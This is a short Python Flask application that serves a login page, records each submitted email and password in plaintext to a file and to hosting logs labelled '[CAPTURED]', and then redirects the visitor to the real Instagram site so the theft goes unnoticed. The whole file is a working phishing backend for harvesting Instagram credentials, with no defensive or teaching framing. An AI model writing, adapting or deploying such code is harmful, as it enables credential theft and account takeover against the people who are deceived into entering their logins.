from flask import Flask, request, render_template, redirect

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']

    # Log to file
    with open("creds.txt", "a") as f:
        f.write(f"Email: {email}, Password: {password}\n")

    # Also log to Render logs
    print(f"[CAPTURED] Email: {email}, Password: {password}")

    # ✅ Redirect to real Instagram login page after form is submitted
    return redirect("https://www.instagram.com/")

if __name__ == "__main__":
    app.run()
